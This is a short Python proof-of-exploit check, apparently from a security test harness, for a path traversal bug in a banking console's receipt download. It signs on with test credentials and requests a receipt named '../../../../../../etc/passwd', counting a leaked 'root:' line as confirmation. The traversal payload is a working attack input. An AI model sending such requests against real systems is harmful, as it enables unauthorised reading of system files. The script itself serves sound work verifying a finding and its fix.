"""LG-PATH-001 proof-of-exploit: path traversal in the console posting-receipt download.

Signs on for a real staff session, then requests /receipt with a name that walks out of the receipt
directory. Fires when the reply leaks a file outside the directory (/etc/passwd, detected by a line
starting 'root:'), which is only possible with receipt_subfolders=on. With the fix the name is
reduced to a basename, so the read stays in the receipt directory and returns 404. Hits the console
directly. Env: PASCAL_URL.
"""

import re

from harness import env, http


def fire():
    console = env.url("PASCAL_URL")
    # A real sign-on (orthogonal to the traversal bug) for a valid session cookie.
    client, _ = http.console_sign_on(console, "TLR001", "teller-pw")
    reply = client.get(f"{console}/receipt?name=../../../../../../etc/passwd")
    if re.search(r"^root:", reply.text, re.MULTILINE):
        return True, "receipt endpoint leaked /etc/passwd -> " + reply.text.splitlines()[0]
    return False, reply.text[:200]
